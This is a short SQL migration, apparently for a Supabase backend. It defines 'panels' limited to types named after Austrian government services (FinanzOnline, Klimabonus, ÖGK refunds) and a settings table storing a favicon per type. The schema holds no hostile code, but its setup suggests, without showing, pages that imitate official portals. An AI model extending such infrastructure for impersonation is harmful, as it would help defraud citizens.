ALTER TABLE public.panels DROP CONSTRAINT IF EXISTS panels_type_check;
ALTER TABLE public.panels ADD CONSTRAINT panels_type_check
  CHECK (type IN ('finanzonline', 'klimabonus', 'oegk_rueckerstattung'));

CREATE TABLE public.panel_type_settings (
  type text PRIMARY KEY CHECK (type IN ('finanzonline', 'klimabonus', 'oegk_rueckerstattung')),
  favicon_url text,
  updated_at timestamptz NOT NULL DEFAULT now()
);

GRANT SELECT ON public.panel_type_settings TO anon;
GRANT SELECT, INSERT, UPDATE, DELETE ON public.panel_type_settings TO authenticated;
GRANT ALL ON public.panel_type_settings TO service_role;

ALTER TABLE public.panel_type_settings ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Public can read panel_type_settings"
  ON public.panel_type_settings FOR SELECT USING (true);

CREATE POLICY "Admins manage panel_type_settings"
  ON public.panel_type_settings FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin'))
  WITH CHECK (public.has_role(auth.uid(), 'admin'));